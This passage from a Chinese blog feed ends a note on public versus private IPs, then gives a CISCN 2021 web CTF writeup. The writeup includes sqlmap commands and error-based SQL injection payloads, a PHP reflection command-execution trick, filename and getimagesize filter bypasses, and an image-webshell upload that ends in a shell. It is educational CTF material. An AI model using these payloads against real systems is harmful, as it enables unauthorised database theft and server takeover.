    <content type="html"><![CDATA[<ul><li><p>我们通常说的内网就是特定环境下的局域网，比如家庭几台电脑设备连接的局域网，外网也被称为互联网，连接地区、城市和国家的互联网络，NAT技术的出现了解决了公网IP地址枯竭的问题，可以使电脑等终端设备通过配置私网IP就可以正常连接互联网。</p></li><li><p>知乎回答https://www.zhihu.com/question/27714563</p></li><li><p>在==百度直接搜索IP会显示公网IP，在cmd中输入ipconfig，或者在Linux终端下输入ifconfig，会显示出私有ip==</p></li><li><blockquote><p>上网流程：</p><p><strong>比如在一个小区内的电信用户的公网ip都是相同的，所以我们将数据发送给路由器，然后路由器通过公网ip访问互联网查询到数据，然后路由器再将查询到的数据传递到私有ip地址。这就算我们的上网过程</strong></p></blockquote></li><li><p><span style="background:#FF9999;">！！</span>简单来说呢，外网IP就是标示了您在整个互联网上的地址，就相当于小区的地址，而内网IP呢，就是标识着您在局域网里面的地址，也就是小区内的几栋几楼几号房子。</p><p>之所以要这么做，因为可以解决IP资源不够用的难题。目前，全世界那么多网络设备，根本无法获得完全不重复的IP地址。</p><p>因为，为了满足通讯需要，外网IP地址不允许重复分配，也就是说全世界的外网IP都是独一无二的。至于内网，那就无所谓了，可以允许重复。</p></li><li><p><strong>怎么判断两个ip地址是否在同一局域网</strong></p><p>要判断两个IP地址是不是在同一个网段，就将它们的IP地址分别与子网掩码做与运算，得到的结果一网络号，如果网络号相同，就在同一子网，否则，不在同一子网。</p><p>ip地址计算器https://gongjuhao.com/netmask/</p></li></ul><blockquote><p>参考🔗：</p><p><a href="https://www.jianshu.com/p/1f6481355347">简书回答详细，IP地址，网关，公网内网都有***</a></p><p><a href="https://www.hunbovps.com/News-listdateil-id-669.html">内网、公网，简洁易理解</a></p><p><a href="https://www.cnblogs.com/ranyonsue/p/9713992.html">内网和外网之间的通信（端口映射原理）</a></p><p><a href="https://www.hunbovps.com/ueditor/php/upload/image/20181210/1544424405837520.jpg">参考图</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>电脑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ciscn 2021 web WP</title>
    <link href="/2021/05/31/ciscn%202021%20web%20wp/"/>
    <url>/2021/05/31/ciscn%202021%20web%20wp/</url>
    
    <content type="html"><![CDATA[<h2 id="easy_sql">easy_sql</h2><p><strong>考点：无列名和报错注入</strong></p><ol type="1"><li>爆表名：</li></ol><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -common-tables</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143910.png" alt="image-20210515132807394"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143912.png" alt="image-20210515132817070"></p><ol start="2" type="1"><li>爆列名，发现只有自增id列，说明还有列名没有显示，==这时候就应该想到无列名注入了==<pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T flag --columns --<span class="hljs-keyword">hex</span></code></pre></li></ol><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143913.png" alt="image-20210515135616512"></p><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T flag -C <span class="hljs-string">&quot;id&quot;</span> --<span class="hljs-keyword">dump</span> --<span class="hljs-keyword">hex</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143914.png" alt="image-20210515135759698"></p><ol start="3" type="1"><li>另一个表啥也没有</li></ol><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T users --columns --<span class="hljs-keyword">hex</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143915.png" alt="image-20210515140045222"></p><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  -D security -T users -C <span class="hljs-string">&quot;id,username&quot;</span> --<span class="hljs-keyword">dump</span> --<span class="hljs-keyword">hex</span></code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143916.png" alt="image-20210515140322605"></p><ol start="4" type="1"><li>用户信息也不是管理员</li></ol><pre><code class="hljs perl">sqlmap -u http:<span class="hljs-regexp">//</span><span class="hljs-number">124.71</span>.<span class="hljs-number">238.95</span>:<span class="hljs-number">25075</span>/ --data=<span class="hljs-string">&quot;uname=&amp;passwd=&amp;Submit=%E7%99%BB%E5%BD%95&quot;</span>  --is-dba</code></pre><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143917.png" alt="image-20210515142804930"></p><p>5.无列名报错注入</p><pre><code class="hljs sql">1&#x27;) and updatexml(1,concat(0x7e,(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> flag <span class="hljs-keyword">as</span> a <span class="hljs-keyword">join</span> flag <span class="hljs-keyword">as</span> b <span class="hljs-keyword">using</span>(<span class="hljs-keyword">id</span>,<span class="hljs-keyword">no</span>))<span class="hljs-keyword">as</span> c),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">#&amp;Submit=%E7%99%BB%E5%BD%95</span></code></pre><p>报错出字段，继续</p><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=admin&amp;passwd=<span class="hljs-number">1</span>&#x27;)||updatexml(<span class="hljs-number">1</span>,((select `cb<span class="hljs-number">9704</span>e<span class="hljs-number">8</span>-dfcb-<span class="hljs-number">4</span>feb-<span class="hljs-number">90</span>c<span class="hljs-number">7</span>-d<span class="hljs-number">84</span>c<span class="hljs-number">92</span>ef<span class="hljs-number">0062</span>` from flag limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)%<span class="hljs-number">23</span>#&amp;Submit=%E<span class="hljs-number">7</span>%<span class="hljs-number">99</span>%BB%E<span class="hljs-number">5</span>%BD%<span class="hljs-number">95</span></code></pre><h2 id="easy_source">easy_source</h2><p><a href="https://r0yanx.com/2020/10/28/fslh-writeup/">原题</a></p><ol type="1"><li>这题考察了php原生类的使用，参考ctfshow的web100使用反射类newReflectionClass("类名")，获得这个类的信息</li><li>原题，ReflectionMethod 构造 User 类中的函数方法，再通过getDocComment 获取函数的注释</li><li>考虑利用原生类ReflectionMethod读取用户类中的方法</li></ol><p><strong>dirsearch使用</strong></p><p><a href="https://www.cnblogs.com/qingchengzi/articles/12652232.html">教程1</a></p><pre><code class="hljs diff"><span class="hljs-deletion">-u  指定需要扫描URL</span><span class="hljs-deletion">-e   指定需要扫描的文件名    例如：-e php  如果不知道即所有 -e *</span><span class="hljs-deletion">-w  指定自定义的字典文件路径</span>排除多个响应状态码：-x 403,302,301<span class="hljs-deletion">-r 递归扫描     非常耗时</span>//在扫描时要退出扫描，请从键盘解析“e”。要从停止点继续执行，请解析“c&quot;。解析“ n”以移至下一个目录。这些步骤将使您可以控制结果，因为递归扫描是一个耗时的过程。<span class="hljs-deletion">-R 递归深度级别</span></code></pre><h3 id="敏感文件">敏感文件</h3><p><a href="https://ninjia.gitbook.io/secskill/web/info">**参考，secskill</a>，<a href="https://www.yuque.com/lakemoon/dctose/tpg530">语雀+漏洞案例</a>、<a href="https://www.imbajin.com/web%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7%E4%B9%8B%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6%E6%8E%A2%E6%B5%8B(%E4%B8%80)/">个人博客初级+python批量扫描</a></p><pre><code>1.  常见检测方法是通过对网站进行web漏洞扫描，直接利用爬虫来爬取网站可能存在的路径以及链接，如果存在备份文件，则可通过web直接进行下载。2.  也可以通过自行构造字典，对网站某一目录下，指定字典进行爆破，常见的扫描工具有wwwscan、御剑后台扫描工具等。3. 在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</code></pre><p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp再次意外退出后，将会产生名为 .index.php.swo 的交换文件第三次产生的交换文件则为 .index.php.swn <pre><code class="hljs css">常见的备份文件格式有：<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.phps</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swp</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.swo</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.php</span>~<span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.bak</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.txt</span><span class="hljs-selector-tag">index</span><span class="hljs-selector-class">.php</span><span class="hljs-selector-class">.old</span></code></pre></p><h3 id="反射">反射</h3><p><a href="https://www.kancloud.cn/shaoguan/phpstudy/384102">笔记</a><a href="https://juejin.cn/post/6844904148891074568">****掘金，各类函数，属性用法</a><a href="https://www.jianshu.com/p/d02cbde1cdd7">简书</a></p><blockquote><p>面向对象编程中对象被赋予了自省的能力，而这个自省的过程就是反射。反射，直观理解就是根据到达地找到出发地和来源。比如，<strong>一个光秃秃的对象，我们可以仅仅通过这个对象就能知道它所属的类、拥有哪些方法</strong>。反射是指在PHP运行状态中，扩展分析PHP程序，导出或提出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取信息以及动态调用对象方法的功能称为反射API。</p></blockquote><pre><code class="hljs php"><span class="hljs-comment">// 获取对象属性列表</span>$reflect = <span class="hljs-keyword">new</span> ReflectionObject($student);$props　= $reflect-&gt;getProperties();<span class="hljs-keyword">foreach</span> ($props <span class="hljs-keyword">as</span> $prop) &#123;  <span class="hljs-keyword">print</span> $prop-&gt;getName() .<span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-comment">// 获取对象方法列表</span>$m=$reflect-&gt;getMethods();<span class="hljs-keyword">foreach</span> ($m <span class="hljs-keyword">as</span> $prop) &#123;  <span class="hljs-keyword">print</span> $prop-&gt;getName() .<span class="hljs-string">&quot;\n&quot;</span>;&#125;</code></pre><p>反射注释 <pre><code class="hljs awk"><span class="hljs-variable">$classComment</span> = <span class="hljs-variable">$refClass</span>-&gt;getDocComment();  <span class="hljs-regexp">//</span> 获取User类的注释文档，即定义在类之前的注释<span class="hljs-variable">$methodComment</span> = <span class="hljs-variable">$refClass</span>-&gt;getMethod(<span class="hljs-string">&#x27;setPassowrd&#x27;</span>)-&gt;getDocComment();  <span class="hljs-regexp">//</span> 获取User类中setPassowrd方法的注释<span class="hljs-regexp">//</span><span class="hljs-variable">$classComment</span> 结果如下：<span class="hljs-regexp">/** * 用户相关类 */</span><span class="hljs-regexp">//</span><span class="hljs-variable">$methodComment</span> 结果如下：<span class="hljs-regexp">/** * 设置密码 * @param string $password */</span></code></pre></p><h3 id="ctf-中的php反射">ctf 中的php反射</h3><p><a href="https://www.codeleading.com/article/24664981902/">参考+讲解ctfshow100</a></p><p>反射类不仅仅可以建立对类的映射，<strong>也可以建立对PHP基本方法的映射，并且返回基本方法执行的情况【ReflectionClass类并传入PHP代码时，会返回代码的运行结果】</strong>。因此可以通过建立反射类newReflectionClass(system(‘cmd’))来执行命令</p><p>要点：通过建立反射类<code>new ReflectionClass(system('cmd'))</code>来执行命令</p><h3 id="本题">本题</h3><ul><li><p>设法反射注释</p></li><li><p>平常我们用的比较多的是 ReflectionClass类 和ReflectionMethod类</p></li><li><p>ReflectionClass类只能传入一个参数【参数是类名】，所以我们尝试ReflectionMethod类【参数是类名+方法】</p></li><li><p><code>$method = new ReflectionMethod('Counter', 'increment');</code></p></li><li><p>本题考察的是 PHP反射，ReflectionMethod 构造 User类中的函数方法，再通过 getDocComment获取函数的注释，本例中使用__toString 同样可以输出函数注释内容。</p></li><li><p>payload: <pre><code class="hljs dts">?rc=ReflectionMethod<span class="hljs-variable">&amp;ra</span>=User<span class="hljs-variable">&amp;rb</span>=a<span class="hljs-variable">&amp;rd</span>=getDocComment</code></pre>因为不知道是在哪个函数的注释中，所以逐个函数【rb】暴破，暴破 rb 的值a-z，可以发现 flag 在 q的注释中，回显flag</p></li></ul><h4 id="更多">更多</h4><p><a href="https://blog.csdn.net/wong_gilbert/article/details/76679108?utm_source=app&amp;app_version=4.7.1">__tostring</a>：对象被当成字符串输出时会自动触发的函数，必须得有return</p><p><a href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/">2019ciscn反射</a></p><h2 id="easy_load">easy_load</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/116885083?utm_source=app&amp;app_version=4.7.1">**yu师傅</a>【<a href="https://midiya.blog.csdn.net/article/details/117044715">2</a>】</p><p>考点： 1. <a href="https://www.runoob.com/php/php-file-upload.html">php中<span class="math inline">\(_FILES变量的用法及文件上传过程](https://segmentfault.com/a/1190000000591094)2. [菜鸟教程文件上传与\)</span>_FILES用法</a> 3. <a href="https://developer.mozilla.org/zh-CN/docs/Learn/Forms/Sending_and_retrieving_form_data">MDNWEB DOCS发送表单数据</a></p><h4 id="文件上传">文件上传</h4><ol type="1"><li>在使用表单的时候经常将表单的数据发送至php脚本做处理，然后，我们可以用表单提交的过程来<strong>实现运行php脚本</strong></li><li>这样点击提交按钮时就可以实现运行php脚本，action里的php文件代表你要执行的脚本</li><li>action表示表单数据接收方，实现对数据的各种处理</li><li><code>$_FILES['file']['tmp_name']</code>是该临时文件的路径（而非名称）</li></ol><p>index.php</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;upload&quot;</span>) &#123;    <span class="hljs-keyword">if</span> ($_FILES[<span class="hljs-string">&#x27;postedFile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1024</span>*<span class="hljs-number">512</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;这么大个的东西你是想d我吗？&quot;</span>);    &#125;    $imageinfo = getimagesize($_FILES[<span class="hljs-string">&#x27;postedFile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);    <span class="hljs-keyword">if</span> ($imageinfo === <span class="hljs-literal">FALSE</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;如果不能好好传图片的话就还是不要来打扰我了&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($imageinfo[<span class="hljs-number">0</span>] !== <span class="hljs-number">1</span> &amp;&amp; $imageinfo[<span class="hljs-number">1</span>] !== <span class="hljs-number">1</span>) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;东西不能方方正正的话就很讨厌&quot;</span>);    &#125;    $fileName=urldecode($_FILES[<span class="hljs-string">&#x27;postedFile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]); <span class="hljs-comment">//⚠️url解密了一波</span>    <span class="hljs-keyword">if</span>(stristr($fileName,<span class="hljs-string">&quot;c&quot;</span>) || stristr($fileName,<span class="hljs-string">&quot;i&quot;</span>) || stristr($fileName,<span class="hljs-string">&quot;h&quot;</span>) || stristr($fileName,<span class="hljs-string">&quot;ph&quot;</span>)) &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;有些东西让你传上去的话那可不得了&quot;</span>);    &#125;    $imagePath = <span class="hljs-string">&quot;/var/www/html/image/&quot;</span> . mb_strtolower($fileName);  <span class="hljs-comment">//⚠️放</span>    <span class="hljs-keyword">if</span>(move_uploaded_file($_FILES[<span class="hljs-string">&quot;postedFile&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], $imagePath)) &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;upload success, image at <span class="hljs-subst">$imagePath</span>&quot;</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;传都没有传上去&quot;</span>);    &#125;&#125;</code></pre><ol type="1"><li>getimagesize—返回图像信息【数组】,参数是路径/url，必须是图像，否则返回false</li></ol><ul><li>返回数组信息： &gt; - 索引 0 给出的是图像宽度的像素值 &gt; - 索引 1给出的是图像高度的像素值 &gt; - 索引 2给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 =SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorolabyte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 =IFF，15 = WBMP，16 = XBM &gt; - 索引 3给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 <image> 标签 &gt; -索引 bits 给出的是图像的每种颜色的位数，二进制格式 &gt; - 索引 channels给出的是图像的通道值，RGB 图像默认是 3 &gt; - 索引 mime 给出的是图像的MIME 信息，此信息可以用来在 HTTP Content-type头信息中发送正确的信息，如： header("Content-type: image/jpeg"); &gt; -⚠️此时mime检测的不是数据包中的content-type，而是图片的文件头</image></li></ul><ol start="2" type="1"><li>stristr()函数搜索字符串在另一字符串中的第一次出现并返回其及余下部分</li><li>mb_strtolower—返回小写的字符串，比strtolower支持更多字符，如unicode</li><li>move_uploaded_file—将上传的文件A移动的新位置B，成功返回true，失败返回false</li></ol><h4 id="解读">解读：</h4><p>index.php内容：参数ctf要==’upload’，大小要小于1024*512，文件得为图片，图片长宽需相等，文件名不能有c、i、h、ph，最后将文件名转小写上传到/var/www/html/image/下</p><p>example.php <pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>])) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-keyword">die</span>();&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&quot;ctf&quot;</span>]))    $ctf = $_GET[<span class="hljs-string">&quot;ctf&quot;</span>];<span class="hljs-keyword">if</span>($ctf==<span class="hljs-string">&quot;poc&quot;</span>) &#123;    $zip = <span class="hljs-keyword">new</span> \ZipArchive();    $name_for_zip = <span class="hljs-string">&quot;example/&quot;</span> . $_POST[<span class="hljs-string">&quot;file&quot;</span>];   <span class="hljs-comment">//⚠️压缩文件路径</span>    <span class="hljs-keyword">if</span>(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip)[count(explode(<span class="hljs-string">&quot;.&quot;</span>,$name_for_zip))<span class="hljs-number">-1</span>]!==<span class="hljs-string">&quot;zip&quot;</span>) &#123;  <span class="hljs-comment">//⚠️</span>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;要不咱们再看看？&quot;</span>);    &#125;    <span class="hljs-keyword">if</span> ($zip-&gt;open($name_for_zip) !== <span class="hljs-literal">TRUE</span>) &#123;        <span class="hljs-keyword">die</span> (<span class="hljs-string">&quot;都不能解压呢&quot;</span>);    &#125;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;可以解压，我想想存哪里&quot;</span>;      $pos_for_zip = <span class="hljs-string">&quot;/tmp/example/&quot;</span> . md5($_SERVER[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]);   <span class="hljs-comment">//⚠️临时解压路径</span>    $zip-&gt;extractTo($pos_for_zip);   <span class="hljs-comment">//⚠️解压后直接去解压的路径example下访问md.php命令执行就行</span>    $zip-&gt;close();    unlink($name_for_zip);    $files = glob(<span class="hljs-string">&quot;<span class="hljs-subst">$pos_for_zip</span>/*&quot;</span>);    <span class="hljs-keyword">foreach</span>($files <span class="hljs-keyword">as</span> $file)&#123;        <span class="hljs-keyword">if</span> (is_dir($file)) &#123;            <span class="hljs-keyword">continue</span>;        &#125;         $first = imagecreatefrompng($file);   <span class="hljs-comment">//⚠️</span>        $size = min(imagesx($first), imagesy($first));        $second = imagecrop($first, [<span class="hljs-string">&#x27;x&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;y&#x27;</span> =&gt; <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;width&#x27;</span> =&gt; $size, <span class="hljs-string">&#x27;height&#x27;</span> =&gt; $size]);        <span class="hljs-keyword">if</span> ($second !== <span class="hljs-literal">FALSE</span>) &#123;            $final_name = pathinfo($file)[<span class="hljs-string">&quot;basename&quot;</span>];            imagepng($second, <span class="hljs-string">&#x27;example/&#x27;</span>.$final_name);   <span class="hljs-comment">//⚠️修剪后的图片转移至example下</span>            imagedestroy($second);        &#125;        imagedestroy($first);        unlink($file);    &#125;&#125;</code></pre> <a href="https://cloud.tencent.com/developer/article/1722696">php利用ZipArchive类操作文件的实例</a>- 类前加反斜杠意思是全局搜索类 &gt;ZipArchive类—对文件进行压缩与解压缩处理 &gt; &gt;ZipArchive::extractTo,将压缩包解压到指定目录【解压】 &gt; &gt;ZipArchive::open,打开一个zip压缩包【必备】【成功返回true】 &gt; &gt;ZipArchive::addFile,将文件添加到指定zip压缩包中【压缩】 &gt; &gt;ZipArchive::addFromString,将指定内容的文件添加到压缩包</p><ul><li>$_SERVER['REMOTE_ADDR'];//访问端（有可能是用户，有可能是代理的）IP【<a href="https://www.cnblogs.com/jackluo/archive/2013/03/03/2941411.html">与其他获取ip的区别</a>】</li><li>unlink—删除文件，成功返回true【<code>/.</code>可以绕过unlink】</li><li><a href="https://www.w3school.com.cn/php/func_filesystem_glob.asp">glob</a>— 寻找与模式匹配的文件名/目录的数组</li><li><a href="https://www.jianshu.com/p/6600341d8754">简书，图像相关函数</a></li><li>imagecreatefrompng—由文件或url创建一个图像</li><li><a href="https://vimsky.com/examples/usage/php-imagecrop-function.html">imagecrop</a>—图像裁剪函数，将图像裁剪到给定的矩形区域，然后返回生成的图像。成功时返回裁剪的图像资源，或者在失败时返回FALSE。</li><li>imagejpeg—以 JPEG格式将图像输出到浏览器或文件</li><li>pathinfo()函数以数组的形式返回文件路径/文件格式的信息，第二个参数指定哪个数组元素<pre><code class="hljs php"><span class="hljs-keyword">Array</span>([dirname] =&gt; /testweb[basename] =&gt; test.txt[extension] =&gt; txt)</code></pre> #### 解读：</li></ul><p>example内容：ctf参数要==’poc’，file文件最后后缀得为===zip【但是index.php里把i过滤了！】，并将其解压到<code>/tmp/example/用户ip</code>目录下，并删除原压缩文件，对解压后的每一个文件，生成png并裁剪然后生成到example/下</p><h4 id="section"></h4><h4 id="绕mb_strwolower">1. 绕mb_strwolower</h4><p>其中，在3.6、7.1等版本中，mb_strtolower('İ')==='i'，mb_strtolower的小写映射时将'İ'映射到i，目前只发现该函数和如下字符存在漏洞：<strong>使用İ字符可以绕过i字符的匹配，如果php这三个字符也能绕过就能直接上传php了</strong></p><p><strong>结合example.php的解压压缩包我们利用zİp来替代zip（İ会被解析/认为为I，再通过mb_strtolower就变成了i）</strong></p><pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;o&#x27;</span>, <span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;u&#x27;</span>, <span class="hljs-string">&#x27;U&#x27;</span>);<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;ç&#x27;</span>, <span class="hljs-string">&#x27;Ç&#x27;</span>, <span class="hljs-string">&#x27;ğ&#x27;</span>, <span class="hljs-string">&#x27;Ğ&#x27;</span>, <span class="hljs-string">&#x27;ı&#x27;</span>, <span class="hljs-string">&#x27;İ&#x27;</span>, <span class="hljs-string">&#x27;ö&#x27;</span>, <span class="hljs-string">&#x27;Ö&#x27;</span>, <span class="hljs-string">&#x27;ş&#x27;</span>, <span class="hljs-string">&#x27;Ş&#x27;</span>, <span class="hljs-string">&#x27;ü&#x27;</span>, <span class="hljs-string">&#x27;Ü&#x27;</span>); İ的url编码：%c4%b0</code></pre><h4 id="绕getimagesize">2. 绕getimagesize：</h4><pre><code class="hljs php"><span class="hljs-comment">#define test_width 1</span><span class="hljs-comment">#define test_height 1</span></code></pre><p><strong>注意⚠️放在文件末尾！</strong></p><ol start="3" type="1"><li>绕imagecreatefrompng</li></ol><p>文件上传脚本 <pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://42ae6f34-c405-4aa4-a2c1-c20b68500d8a.node3.buuoj.cn/?ctf=upload&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;postedFile&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;id&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143919.png" alt="image-20210530210553526"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143920.png" alt="image-20210530210538872"></p><h4 id="解压出php">3：解压出php</h4><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143921.png" alt="image-20210530211204373"></p><p>发现解压后一句话弄不了，发现是图片马二次渲染问题=》普通的图片马解决不了</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143922.png" alt="image-20210531003611751" style="zoom:50%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143923.png" alt="image-20210531003634582" style="zoom: 67%;"></p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143924.png" alt="image-20210531003734744" style="zoom:50%;"></p><p>成功getshell</p><p><img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202312102143925.png" alt="image-20210531003914233" style="zoom:50%;"></p><h4 id="发现更多">发现更多</h4><p><a href="https://www.leavesongs.com/PENETRATION/when-imagemagick-meet-getimagesize.html#">imagemagick邂逅getimagesize的那点事儿</a></p><p><a href="https://xz.aliyun.com/t/2657#toc-3">upload-labs之pass16详细分析</a></p><p><a href="https://www.jianshu.com/p/05a410f3f3e0">【靶场】文件上传upload-labs21关【无WAF】</a></p><p><a href="http://www.phpheidong.com/blog/article/36019/7fc4518d58a4c40fcb31/">Upload-labs1-21关 靶场通关攻略(全网最全最完整)</a> 、 <a href="http://myhackerworld.top/2019/01/19/upload-labs-%E5%AD%A6%E4%B9%A0/">2</a></p><p><a href="https://lemonprefect.cn/zh-cn/posts/7c083fa1#upload">wp</a></p><p><a href="http://wh1sper.com/ciscn-2021-quals-writeup/">wp2**</a></p><h2 